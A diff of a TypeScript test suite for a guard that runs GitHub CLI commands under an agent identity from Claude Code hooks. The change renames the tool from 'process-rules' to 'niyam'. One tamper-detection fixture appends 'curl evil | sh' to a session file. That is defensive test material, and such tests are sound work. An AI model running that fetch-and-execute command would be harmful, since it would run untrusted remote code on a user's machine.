@@ -16,7 +16,7 @@ import { run } from './run.ts';
 const ID = 'abc-123';
 const RECORD = sessionRecord(HOME, ID) as string;
 const SESSION = pathsFor(HOME, AGENT).session;
-const REFUSED = 'process-rules: refused, because this session does not work as the agent on GitHub:';
+const REFUSED = 'niyam: refused, because this session does not work as the agent on GitHub:';
 
 /** A hook's machine: set up by `machine`, the session recorded as the agent, the settings' lock in the hook's env. */
 function hookSys(): FakeSys {
@@ -94,21 +94,21 @@ describe('as-agent', () => {
   it('says why a command could not start, keeping its exit code', () => {
     const sys = hookSys();
     sys.execOverride = (call) => (call.interactive ? { code: 127, stdout: '', stderr: 'Error: spawnSync gh ENOENT' } : undefined);
-    assert.deepEqual(asAgentIn(sys).err, ['process-rules as-agent: gh: Error: spawnSync gh ENOENT']);
+    assert.deepEqual(asAgentIn(sys).err, ['niyam as-agent: gh: Error: spawnSync gh ENOENT']);
   });
 
   const locked: [string, (sys: FakeSys) => void, string][] = [
     ['no record for the session', (sys) => sys.files.delete(RECORD), 'session-start did not run for this session, so it was not given the agent identity'],
-    ['a record of a locked session', (sys) => sys.files.set(RECORD, '{"problem":"process-rules: GitHub is locked out of this session: x."}\n'), 'session-start said: process-rules: GitHub is locked out of this session: x'],
+    ['a record of a locked session', (sys) => sys.files.set(RECORD, '{"problem":"niyam: GitHub is locked out of this session: x."}\n'), 'session-start said: niyam: GitHub is locked out of this session: x'],
     ['a record session-start did not write', (sys) => sys.files.set(RECORD, 'nope'), `${RECORD} is not what session-start writes`],
     ['a record of null', (sys) => sys.files.set(RECORD, 'null\n'), `${RECORD} is not what session-start writes`],
     ['a record naming an account the settings do not', (sys) => sys.files.set(RECORD, '{"agent":"OtherBot"}\n'), "session-start recorded OtherBot, and the repo's settings name the agents ExampleBot"],
     ['no settings', (sys) => sys.files.delete(`${ROOT}/.github/process-rules.json`), ''],
     ['no repository', (sys) => { sys.inRepo = false; }, `${ROOT} is not inside a git repository`],
     ['no session file', (sys) => sys.files.delete(SESSION), `${SESSION} is missing or cannot be read`],
-    ['an edited session file', (sys) => sys.files.set(SESSION, `${sys.files.get(SESSION)}curl evil | sh\n`), `${SESSION} is out of date, or not the file process-rules machine writes, for ExampleBot`],
+    ['an edited session file', (sys) => sys.files.set(SESSION, `${sys.files.get(SESSION)}curl evil | sh\n`), `${SESSION} is out of date, or not the file niyam machine writes, for ExampleBot`],
     ['no token in the keychain', (sys) => sys.keychain.clear(), "this Mac's keychain has no ExampleBot token"],
-    ['a platform with no token store', (sys) => { sys.platform = 'linux'; }, "process-rules supports macOS only, where the keychain holds the agent's token; this machine runs linux"],
+    ['a platform with no token store', (sys) => { sys.platform = 'linux'; }, "niyam supports macOS only, where the keychain holds the agent's token; this machine runs linux"],
   ];
   for (const [name, change, reason] of locked) {
     it(`runs nothing, exiting ${LOCKED} in the guard's words, with ${name}`, () => {
@@ -148,7 +148,7 @@ describe('as-agent', () => {
   it('runs nothing in a cloud session session-start did not check as the agent', () => {
     const sys = hookSys();
     sys.env = { ...sys.env, CLAUDE_CODE_REMOTE: 'true' };
-    sys.files.set(RECORD, '{"problem":"process-rules: STOP. This cloud session reaches GitHub as someone, not ExampleBot."}\n');
+    sys.files.set(RECORD, '{"problem":"niyam: STOP. This cloud session reaches GitHub as someone, not ExampleBot."}\n');
     const { code, ran } = asAgentIn(sys);
     assert.deepEqual({ code, ran }, { code: LOCKED, ran: [] });
   });
@@ -159,7 +159,7 @@ describe('as-agent', () => {
     assert.match(err[0] ?? '', /needs -- between/);
     assert.equal(await run(['as-agent', '--session', ID, '--', 'gh', 'x', 'y'], io, () => hookSys()), 0);
     assert.equal(await run(['as-agent', '--session', ID, '--', 'gh'], io, () => { throw new Error('boom'); }), LOCKED);
-    assert.equal(err.at(-1), 'process-rules as-agent: ran nothing, because the check failed: boom');
+    assert.equal(err.at(-1), 'niyam as-agent: ran nothing, because the check failed: boom');
   });
 });
 
@@ -169,7 +169,7 @@ describe('as-agent from a hook', () => {
   after(() => rmSync(dir, { recursive: true, force: true }));
   const home = join(dir, 'home');
   const repo = join(dir, 'repo');
-  const launcher = join(dir, 'process-rules');
+  const launcher = join(dir, 'niyam');
   mkdirSync(join(repo, '.github'), { recursive: true });
   writeFileSync(join(repo, '.github/process-rules.json'), JSON.stringify({ owner: 'example-owner', agent: AGENT }));
   spawnSync('git', ['init', '-q', repo]);
@@ -209,7 +209,7 @@ describe('hooksHittingLock', () => {
       {
         SessionStart: [HOOK_COMMAND],
         PreToolUse: [GUARD_COMMAND, 'gh api graphql -f query=x', '"$CLAUDE_PROJECT_DIR"/.claude/hooks/pr.sh', 'bash .claude/hooks/wrapped.sh'],
-        Stop: ['sid=$(jq -r .session_id); process-rules as-agent --session "$sid" -- gh pr view', 'echo done', './missing.sh', '/usr/local/bin/x.sh', 'gh pr list && process-rules as-agent --session "$sid" -- gh pr view'],
+        Stop: ['sid=$(jq -r .session_id); niyam as-agent --session "$sid" -- gh pr view', 'echo done', './missing.sh', '/usr/local/bin/x.sh', 'gh pr list && niyam as-agent --session "$sid" -- gh pr view'],
       },
       {
         '.claude/hooks/pr.sh': '#!/bin/sh\ngh pr view --json state\n',
@@ -219,7 +219,7 @@ describe('hooksHittingLock', () => {
     assert.deepEqual(hooksHittingLock(sys), [
       '.claude/settings.json PreToolUse hook "gh api graphql -f query=x"',
       '.claude/settings.json PreToolUse hook .claude/hooks/pr.sh',
-      '.claude/settings.json Stop hook "gh pr list && process-rules as-agent --session \\"$sid\\" -- gh pr view"',
+      '.claude/settings.json Stop hook "gh pr list && niyam as-agent --session \\"$sid\\" -- gh pr view"',
     ]);
   });
 
@@ -269,7 +269,7 @@ describe('hooksHittingLock', () => {
   /** A bash hook running Python from a heredoc that imports `module` and names gh and git push as a variable and in a message (#211). */
   const pythonHook = (module: string): string =>
     `#!/bin/bash\nexec python3 - <<'PY'\nimport json, os, shutil\ntry:\n    ${module}\nexcept Exception:\n    pass\ngh = shutil.which("gh")\nprint("Push the branch first (git push -u origin HEAD)")\nPY\n`;
-  const helper = '"""Runs a hook\'s gh through as-agent."""\ndef wrap(argv, session_id):\n    return ["process-rules", "as-agent", "--session", session_id, "--"] + list(argv)\n';
+  const helper = '"""Runs a hook\'s gh through as-agent."""\ndef wrap(argv, session_id):\n    return ["niyam", "as-agent", "--session", session_id, "--"] + list(argv)\n';
 
   it('takes a script that imports a repo helper running as-agent as routed through it (#211)', () => {
     const sys = withHooks(
